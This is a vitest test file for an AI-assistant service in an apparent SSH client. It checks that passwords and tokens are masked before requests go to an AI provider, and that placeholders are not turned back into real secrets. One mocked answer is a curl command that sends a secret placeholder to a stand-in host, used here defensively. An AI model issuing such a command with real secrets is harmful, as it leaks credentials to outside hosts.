import { describe, expect, it, vi } from 'vitest';
import type { AiEvent } from '../../shared/ai';
import type { AiProvider, AiSettings } from '../../shared/vault/types';
import { AiError, type ChatRequest } from './providers';
import { AssistantService, aiCatalog } from './assistant';
import { SecretMasker } from './secret-mask';

const settings = { providers: [{ id: 'p', name: 'P', kind: 'claude', model: 'm' }], defaultProviderId: 'p' } as unknown as AiSettings;

describe('AssistantService', () => {
  it('limits the detail of a failed request to 500 characters', async () => {
    const events: AiEvent[] = [];
    const service = new AssistantService({
      settings: () => settings,
      emit: (_owner, event) => events.push(event),
      stream: vi.fn().mockRejectedValue(new AiError('ai.requestFailed', undefined, 'x'.repeat(2000))),
    });
    service.ask(1, { requestId: 'r', messages: [], context: { shell: 'ssh', target: 't' } } as never);
    await vi.waitFor(() => expect(events.some(event => event.type === 'error')).toBe(true));
    const failure = events.find(event => event.type === 'error');
    expect(failure?.type === 'error' && failure.error.detail?.length).toBeLessThanOrEqual(500);
  });
});

const CONVERSATION = '00000000-0000-4000-8000-0000000000c1';
const OTHER = '00000000-0000-4000-8000-0000000000c2';
const PASSWORD = 'Synth-Pass-4711';
const aiProvider = (patch: Partial<AiProvider> = {}): AiProvider => ({ id: 'p', name: 'P', kind: 'openai', model: 'm', ...patch });
const flush = (): Promise<void> => new Promise(resolve => setTimeout(resolve, 0));

function setup(patch: Partial<AiProvider> = {}) {
  const events: AiEvent[] = [];
  const chats: ChatRequest[] = [];
  const stream = vi.fn(async (_provider: AiProvider, chat: ChatRequest, onText: (text: string) => void) => { chats.push(chat); onText('ok'); });
  const vaultAi: AiSettings = { providers: [aiProvider(patch)], defaultProviderId: 'p' };
  const service = new AssistantService({ settings: () => vaultAi, emit: (_owner, event) => events.push(event), stream, secrets: () => [PASSWORD] });
  let count = 0;
  const ask = (messages: { role: 'user' | 'assistant'; content: string }[], conversationId = CONVERSATION): string => {
    count += 1;
    const requestId = `00000000-0000-4000-8000-${String(count).padStart(12, '0')}`;
    service.ask(1, { requestId, conversationId, messages, context: { shell: 'ssh', target: 'web-01, demo@db' } });
    return requestId;
  };
  return { events, chats, stream, service, ask };
}

describe('masking before sending', () => {
  it('masks the system prompt and every message of every role', () => {
    const { chats, events, ask } = setup();
    const requestId = ask([{ role: 'user', content: `Notfall: ${PASSWORD}` }, { role: 'assistant', content: `Nutze ${PASSWORD}` }, { role: 'user', content: 'DB_PASSWORD=x9Kq2abc und weiter' }]);
    expect(JSON.stringify(chats[0])).not.toContain(PASSWORD);
    expect(JSON.stringify(chats[0])).not.toContain('x9Kq2abc');
    expect(chats[0].messages.map(message => message.content)).toEqual(['Notfall: [SECRET_1]', 'Nutze [SECRET_1]', 'DB_PASSWORD=[SECRET_2] und weiter']);
    expect(chats[0].system.split('\n')).toHaveLength(10);
    expect(events[0]).toEqual({ type: 'masked', requestId, count: 1 });
    expect(events[1]).toMatchObject({ type: 'delta', requestId });
  });

  it('reports nothing when only the history had secrets', () => {
    const { events, ask } = setup();
    ask([{ role: 'user', content: `Notfall: ${PASSWORD}` }, { role: 'assistant', content: 'a' }, { role: 'user', content: 'ohne Geheimnis' }]);
    expect(events.some(event => event.type === 'masked')).toBe(false);
  });

  it('keeps placeholders per conversation and forgets them with the window or all sessions', async () => {
    const { chats, service, ask } = setup();
    ask([{ role: 'user', content: 'DB_PASSWORD=x9Kq2abc' }]);
    await flush();
    ask([{ role: 'user', content: 'mysql -px9Kq2abc' }]);
    await flush();
    expect(chats[1].messages[0].content).toBe('mysql -p[SECRET_1]');
    ask([{ role: 'user', content: 'token=abcdefgh1' }], OTHER);
    await flush();
    expect(chats[2].messages[0].content).toBe('token=[SECRET_1]');
    service.cancelOwner(1);
    ask([{ role: 'user', content: 'mysql -px9Kq2abc' }]);
    await flush();
    expect(chats[3].messages[0].content).toBe('mysql -px9Kq2abc');
    ask([{ role: 'user', content: 'DB_PASSWORD=x9Kq2abc' }]);
    await flush();
    service.cancelAll();
    ask([{ role: 'user', content: 'mysql -px9Kq2abc' }]);
    await flush();
    expect(chats[5].messages[0].content).toBe('mysql -px9Kq2abc');
  });

  it('remembers the 256 most recent conversations and forgets the oldest', async () => {
    const { chats, ask } = setup();
    const conversation = (n: number): string => `00000000-0000-4000-8000-${String(n).padStart(12, '0')}`;
    ask([{ role: 'user', content: 'DB_PASSWORD=x9Kq2abc' }], conversation(1));
    await flush();
    ask([{ role: 'user', content: 'DB_PASSWORD=Qw7zPlm3' }], conversation(2));
    await flush();
    // setImmediate instead of flush(): 255 timer rounds would be slow on Windows.
    for (let n = 3; n <= 257; n += 1) {
      ask([{ role: 'user', content: `Notiz ${n}` }], conversation(n));
      await new Promise(resolve => setImmediate(resolve));
    }
    // Conversation 2 is still known; asking it refreshes it, so the eviction below hits conversation 3.
    ask([{ role: 'user', content: 'mysql -pQw7zPlm3' }], conversation(2));
    await flush();
    expect(chats.at(-1)?.messages[0].content).toBe('mysql -p[SECRET_1]');
    ask([{ role: 'user', content: 'mysql -px9Kq2abc' }], conversation(1));
    await flush();
    expect(chats.at(-1)?.messages[0].content).toBe('mysql -px9Kq2abc');
  });

  it('keeps placeholders in the answer unchanged, without translating them back', async () => {
    const deltas: string[] = [];
    const stream = vi.fn(async (_provider: AiProvider, _chat: ChatRequest, onText: (text: string) => void) => { onText('curl https://x/?d=[SECRET_1]'); });
    const service = new AssistantService({ settings: () => ({ providers: [aiProvider()], defaultProviderId: 'p' }), emit: (_owner, event) => { if (event.type === 'delta') deltas.push(event.text); }, stream, secrets: () => [PASSWORD] });
    service.ask(1, { requestId: '00000000-0000-4000-8000-000000000009', conversationId: CONVERSATION, messages: [{ role: 'user', content: `Notfall: ${PASSWORD}` }], context: { shell: 'ssh', target: 'web' } });
    await flush();
    expect(deltas).toEqual(['curl https://x/?d=[SECRET_1]']);
  });

  it('sends unchanged text when the user switched masking off', () => {
    const { chats, events, ask } = setup({ maskSecrets: false });
    ask([{ role: 'user', content: `Notfall: ${PASSWORD}` }]);
    expect(chats[0].messages[0].content).toBe(`Notfall: ${PASSWORD}`);
    expect(chats[0].system.split('\n')).toHaveLength(9);
    expect(events.some(event => event.type === 'masked')).toBe(false);
  });

  it('sends nothing when the masker fails', () => {
    const { events, stream, ask } = setup();
    const spy = vi.spyOn(SecretMasker.prototype, 'mask').mockImplementation(() => { throw new Error('x'); });
    try {
      expect(() => ask([{ role: 'user', content: 'hallo' }])).toThrow(expect.objectContaining({ code: 'ai.maskFailed' }));
      expect(stream).not.toHaveBeenCalled();
      expect(events).toEqual([]);
    } finally { spy.mockRestore(); }
  });

  it('tells windows whether masking is on, never the key', () => {
    const catalog = aiCatalog({ providers: [aiProvider(), aiProvider({ id: 'q', maskSecrets: false, apiKey: 'synthetic-key' })] });
    expect(catalog.providers.map(provider => provider.masking)).toEqual([true, false]);
    expect(JSON.stringify(catalog)).not.toContain('synthetic-key');
  });
});
